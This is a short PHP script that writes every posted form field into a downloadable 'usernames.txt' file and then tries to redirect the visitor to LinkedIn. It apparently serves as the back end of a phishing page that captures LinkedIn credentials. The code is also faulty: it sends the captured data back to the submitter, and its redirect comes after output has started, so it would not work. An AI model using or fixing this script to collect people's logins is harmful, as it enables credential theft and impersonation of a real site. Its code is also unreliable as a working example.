<?php
header('Content-Disposition: attachment; filename="usernames.txt"');
header('Content-Type: text/plain');

$handle = fopen("php://output", "w");
foreach($_POST as $variable=>$value)
{
fwrite($handle,$variable);
fwrite($handle,"-");
fwrite($handle,$value);
fwrite($handle,"\r\n");
}
fwrite($handle,"\r\n");
fclose($handle);
header("location:https://www.linkedin.com/");
exit;
?>
